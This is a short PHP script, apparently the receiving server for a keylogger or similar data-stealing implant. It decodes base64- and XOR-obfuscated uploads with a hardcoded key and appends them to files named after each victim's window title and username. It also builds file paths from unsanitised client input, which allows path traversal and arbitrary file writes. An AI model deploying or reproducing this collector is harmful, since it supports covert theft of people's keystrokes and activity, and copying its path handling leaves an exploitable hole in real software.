<?php
// Function to perform XOR on the input string with the secret key
function xorWithKey($input, $key) {
    $output = '';
    $keyLen = strlen($key);
    for ($i = 0; $i < strlen($input); ++$i) {
        $output .= $input[$i] ^ $key[$i % $keyLen];
    }
    return $output;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $postData = file_get_contents('php://input');

    // Convert raw JSON
    $data = json_decode($postData, true);

    // Get the POST data
    $encodedData = $data['data'];
    $windowName = $data['windows_name'];
    $username = $data['username'];

    // Base64 decode the encoded data
    $decodedData = base64_decode($encodedData);

    // XOR decode the data using the secret key (e.g., 'your_secret_key')
    $secretKey = 'MySecretKey123';
    $decodedData = xorWithKey($decodedData, $secretKey);

    // Create the directory for the window_name parameter if it doesn't exist
    if (!is_dir("./recvData/" . $windowName)) {
        mkdir("./recvData/" . $windowName, 0755, true);
    }

    // Save the data to the file in the directory with the username_name parameter
    $filePath = "./recvData/" . $windowName . '/' . $username . '_name.txt';

    // Append the data to the file if it already exists, otherwise create a new file
    file_put_contents($filePath, $decodedData . "\n", FILE_APPEND);

    // Send a response back to the client
    echo "OK";
}
?>
